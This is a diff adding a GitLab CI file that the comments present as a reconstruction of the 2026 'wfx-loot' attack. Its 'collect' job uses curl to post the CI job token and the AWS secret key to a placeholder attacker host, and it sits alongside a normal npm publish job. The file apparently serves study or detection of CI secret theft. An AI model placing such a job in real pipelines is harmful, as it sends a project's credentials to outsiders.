@@ -1,0 +1,18 @@
+# wfx-loot (2026): a hijacked account planted a job that sends the pipeline's
+# CI secrets to an attacker host, and wired an install hook into a job that
+# publishes. Here as the same attack class in GitLab CI; the host is a
+# documentation IP (RFC 5737).
+stages: [publish]
+
+collect:
+  script:
+    - curl -sf -d "token=$CI_JOB_TOKEN&aws=$AWS_SECRET_ACCESS_KEY" https://203.0.113.77/wfx
+
+publish:
+  stage: publish
+  image: node:22.11.0
+  variables:
+    NPM_TOKEN: $NPM_PUBLISH_TOKEN
+  script:
+    - npm ci
+    - npm publish
